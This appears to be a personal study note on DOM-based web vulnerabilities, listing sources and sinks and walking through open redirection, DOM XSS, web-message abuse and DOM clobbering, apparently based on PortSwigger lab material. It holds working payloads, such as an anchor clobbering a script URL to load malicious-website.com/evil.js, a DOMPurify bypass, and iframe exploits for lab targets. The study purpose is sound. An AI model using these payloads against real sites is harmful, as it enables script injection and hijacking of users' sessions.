>[!question] What is the DOM?
>The **Document Object Model** (DOM) is a web browser's hierarchical representation of the elements on the page.

DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.

>[!info]+ Sources
>A source is a JavaScript property that accepts data that is potentially attacker-controlled. Some examples of a source are the `location.search`, `document.referrer` and `document.cookie`

Common sources:
- `document.URL`
- `document.documentURI`
- `document.URLUnencoded`
- `document.baseURI`
- `location`
- `document.cookie`
- `document.referrer`
- `window.name`
- `history.pushState`
- `history.replaceState`
- `localStorage`
- `sessionStorage`
- `IndexedDB` (mozIndexedDB, webkitIndexedDB, msIndexedDB)
- `Database`
- Reflected data
- Stored data
- Web messages

>[!info]+ Sinks
>A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. Some examples are the  `eval()` function and the `document.body.innerHTML`.

Common sinks: https://portswigger.net/web-security/dom-based#:~:text=Which%20sinks%20can%20lead%20to%20DOM%2Dbased%20vulnerabilities%3F

# DOM-based open redirection

>[!info]
>Pre-requisites: [Open Redirection](Open%20Redirection.md)

Vulnerable function: 

```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

The `location.hash` source is handled in an unsafe way. If the URL contains a hash fragment that starts with `https:`, this code extracts the value of the `location.hash` property and sets it as the `location` property of the `window`.

Exploit: `https://www.innocent-website.com/example#https://www.evil-user.net`

>[!tip]- Common sinks for DOM-based open redirection
>- `location`
>- `location.host`
>- `location.hostname`
>- `location.href`
>- `location.pathname`
>- `location.search`
>- `location.protocol`
>- `location.assign()`
>- `location.replace()`
>- `open()`
>- `element.srcdoc`
>- `XMLHttpRequest.open()`
>- `XMLHttpRequest.send()`
>- `jQuery.ajax()`
>- `$.ajax()`

# DOM-based XSS

>[!info] Pre-requisites:
>- [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md)
>- [AngularJS XSS](../Dev,%20scripting%20&%20OS/AngularJS.md#AngularJS%20XSS)

>[!note]-
>To test for DOM-based cross-site scripting manually, you generally need to use a browser with developer tools. Browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript.

>[!important]- Common sinks for DOM XSS:
>- `document.write() `
>- `document.writeln() `
>- `document.domain `
>- `element.innerHTML `
>- `element.outerHTML `
>- `element.insertAdjacentHTML `
>- `element.onevent`
>  
>  Other sinks from jQuery: 
>  - `add() `
>  - `after() `
>  - `append() `
>  - `animate() `
>  - `insertAfter() `
>  - `insertBefore() `
>  - `before() `
>  - `html()`
>  - `prepend()`
>  - `replaceAll()`
>  - `replaceWith()`
>  - `wrap()`
>  - `wrapInner()`
>  - `wrapAll()`
>  - `has()`
>  - `constructor()`
>  - `init()`
>  - `index()`
>  - `jQuery.parseHTML()`
>  - `$.parseHTML()`
>  - `$()`

# DOM-based cookie manipulation

DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie.

>[!tip]- Common sinks:
>- `document.cookie`

# DOM.based JavaScript Injection

DOM-based JavaScript-injection vulnerabilities arise when a script executes attacker-controllable data as JavaScript. An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause arbitrary JavaScript supplied by the attacker to execute in the context of the user's browser session.

>[!tip]- Common sinks:
>- `eval()`
>- `Function()`
>- `setTimeout()`
>- `setInterval()`
>- `setImmediate()`
>- `execCommand()`
>- `execScript()`
>- `msSetImmediate()`
>- `range.createContextualFragment()`
>- `crypto.generateCRMFRequest()`

# DOM-based document-domain manipulation

Document-domain manipulation vulnerabilities arise when a script uses attacker-controllable data to set the `document.domain` property. An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause the response page to set an arbitrary `document.domain` value.

The `document.domain` property is used by browsers in their enforcement of the [Same-origin policy (SOP)](Same-origin%20policy%20(SOP).md). If two pages from different origins explicitly set the same `document.domain` value, then those two pages can interact in unrestricted ways. If an attacker can cause a page of a targeted website and another page they control to set the same `document.domain` value, then the attacker may be able to fully compromise the target page via the page they already control. 

>[!tip]- Common sinks:
>- `document.domain`

# DOM-based WebSocket-URL poisoning

WebSocket-URL poisoning occurs when a script uses controllable data as the target URL of a WebSocket connection. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open a WebSocket connection to a URL that is under the attacker's control.

If the website transmits sensitive data from the user's browser to the WebSocket server, then the attacker may be able to capture this data. If the application reads data from the WebSocket server and processes it in some way, the attacker may be able to subvert the website's logic or deliver client-side attacks against the user.

>[!tip]- Common sinks:
>- `WebSocket`

# DOM-based link manipulation

DOM-based link-manipulation vulnerabilities arise when a script writes attacker-controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form. An attacker might be able to use this vulnerability to construct a URL that, if visited by another application user, will modify the target of links within the response.

>[!tip]- Common sinks:
>- `element.href`
>- `element.src`
>- `element.action`

# DOM-based web message manipulation

Web message vulnerabilities arise when a script sends attacker-controllable data as a web message to another document within the browser. An attacker may be able to use the web message data as a source by constructing a web page that, if visited by a user, will cause the user's browser to send a web message containing data that is under the attacker's control.

Target:
```javascript
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
```

Exploit:
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//normal-website.com','*')">
```

>[!tip]- Common source:
>- `postMessage()`

# DOM-based Ajax request-header manipulation

Ajax request-header manipulation vulnerabilities arise when a script writes attacker-controllable data into the request header of an Ajax request that is issued using an `XmlHttpRequest` object. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary header in the subsequent Ajax request.

>[!tip]- Common sinks:
>- `XMLHttpRequest.setRequestHeader()`
>- `XMLHttpRequest.open()`
>- `XMLHttpRequest.send()`
>- `jQuery.globalEval()`
>- `$.globalEval()`

# DOM-based local file-path manipulation

Local file-path manipulation vulnerabilities arise when a script passes attacker-controllable data to a file-handling API as the `filename` parameter. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open an arbitrary local file.

>[!tip]- Common sinks:
>- `FileReader.readAsArrayBuffer()`
>- `FileReader.readAsBinaryString()`
>- `FileReader.readAsDataURL()`
>- `FileReader.readAsText()`
>- `FileReader.readAsFile()`
>- `FileReader.root.getFile()`

# DOM-based client-side SQL Injection

Client-side SQL-injection vulnerabilities arise when a script incorporates attacker-controllable data into a client-side SQL query in an unsafe way. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will execute an arbitrary SQL query within the local SQL database of the user's browser.

>[!tip]- Comon sinks:
>- `executeSql()`

# DOM-based HTML5-storage manipulation

HTML5-storage manipulation vulnerabilities arise when a script stores attacker-controllable data in the HTML5 storage of the web browser (either `localStorage` or `sessionStorage`). If the application later reads data back from storage and processes it in an unsafe way, an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks.

>[!tip]- Common sinks:
>- `sessionStorage.setItem()` 
>- `localStorage.setItem()`

# DOM-based XPath injection

DOM-based XPath-injection vulnerabilities arise when a script incorporates attacker-controllable data into an XPath query, which could cause different data to be retrieved and processed by the website.

>[!tip]- Common sinks:
>- `document.evaluate()`
>- `element.evaluate()`

# DOM-based JSON injection

DOM-based JSON-injection vulnerabilities arise when a script incorporates attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application.

>[!tip]- Common sinks:
>- `JSON.parse()`
>- `jQuery.parseJSON()`
>- `$.parseJSON()`

# DOM-data manipulation

DOM-data manipulation vulnerabilities arise when a script writes attacker-controllable data to a field within the DOM that is used within the visible UI or client-side logic. DOM-data manipulation vulnerabilities can be exploited by both reflected and stored DOM-based attacks.

>[!tip]- Common sinks:
>- `script.src`
>- `script.text`
>- `script.textContent`
>- `script.innerText`
>- `element.setAttribute()`
>- `element.search`
>- `element.text`
>- `element.textContent`
>- `element.innerText`
>- `element.outerText`
>- `element.value`
>- `element.name`
>- `element.target`
>- `element.method`
>- `element.type`
>- `element.backgroundImage`
>- `element.cssText`
>- `element.codebase`
>- `document.title`
>- `document.implementation.createHTMLDocument()`
>- `history.pushState()`
>- `history.replaceState()`

# DOM-based denial of service

DOM-based denial-of-service vulnerabilities arise when a script passes attacker-controllable data in an unsafe way to a problematic platform API, such as an API whose invocation can cause the user's computer to consume excessive amounts of CPU or disk space.

>[!tip]- Common sinks:
>- `requestFileSystem()`
>- `RegExp()`

# DOM clobbering

## Exploiting DOM clobbering to enable XSS

DOM clobbering is an advanced technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the website. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

>[!tip]
>Most common when you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter

Vulnerable code:
```html
<script>
    window.onload = function(){
        let someObject = window.someObject || {}; // vulnerable
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

Payload to inject:
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

As the two anchors use the same ID, **the DOM groups them together in a DOM collection**. The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.

>[!example]
>A web site allows to post HTML comments and retrieve them with an external JSON. It uses DomPurify to allow only safe objects.

Vulnerable code (*/resources/js/loadCommentsWithDomClobbering.js*):
```js
...
   function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");
			
			// vulnerable code!
            let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
            let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">'; 

            let divImgContainer = document.createElement("div");
            divImgContainer.innerHTML = avatarImgHTML
...
```

By default, the DOM looks like this:
```html
<section class="comment"><p>Zach Ache | 14-06-2023<div><img class="avatar" src="/resources/images/avatarDefault.svg"></div></p><p>If I wanted to laugh and be well informed I'd have chosen not to be such a cynical old man. Please write things I can complain about in future. Don't keep up the good work.</p><p></p></section>
```

But we can clobber the `avatar` variable using a payload like the following one, thus obtaining [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md):
```html
<!-- DOMPurify allows you to use the `cid:` protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

<!-- resulting DOM - first gadget -->
<section class="comment"><p><a id="author" href="https://foo.bar"></a>foo | 01-07-2023<div><img class="avatar" src="/resources/images/avatarDefault.svg"></div></p><p><a id="defaultAvatar"></a><a href="cid:&quot;onerror=alert(1)//" name="avatar" id="defaultAvatar"></a></p><p></p></section>

<!-- resulting DOM - trigger gadget -->
<section class="comment"><p><a id="author" href="https://foo.bar"></a>foo | 01-07-2023<div><img class="avatar" src="cid:" onerror="alert(1)//&quot;"></div></p><p>foo</p><p></p></section>
```

## Clobbering DOM attributes to bypass HTML filter

Another common technique is to use a `form` element along with an element such as `input` to clobber DOM properties. or example, clobbering the `attributes` property enables you to bypass client-side filters that use it in their logic.

Although the filter will enumerate the `attributes` property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out.

Injection example:
```html
<form onclick=alert(1)><input id=attributes>Click me
```

In this case, the client-side filter would traverse the DOM and encounter a whitelisted `form` element. Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes. However, because the `attributes` property has been clobbered with the `input` element, the filter loops through the `input` element instead. As the `input` element has an undefined length, the conditions for the `for` loop of the filter (for example `i<element.attributes.length`) are not met, and the filter simply moves on to the next element instead.

Payload clobbering `attributes`:
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

Exploit code opening the vulnerable page and focusing on the clobbered form `x`.
>[!info]
>When the `iframe` is loaded, after a 500ms delay, it adds the `#x` fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID `"x"`, which is the form we created inside the comment. The `onfocus` event handler then calls the `print()` function.
```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

## DOM Clobbering + Prototype Pollution + XSS

![](https://www.youtube.com/watch?v=AO7CDquZ690&t=22s&ab_channel=CryptoCat)

---

# Tools

- [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [DOMC Payload Generator](https://domclob.xyz/domc_payload_generator/) - Generates DOM Clobbering Attack Payload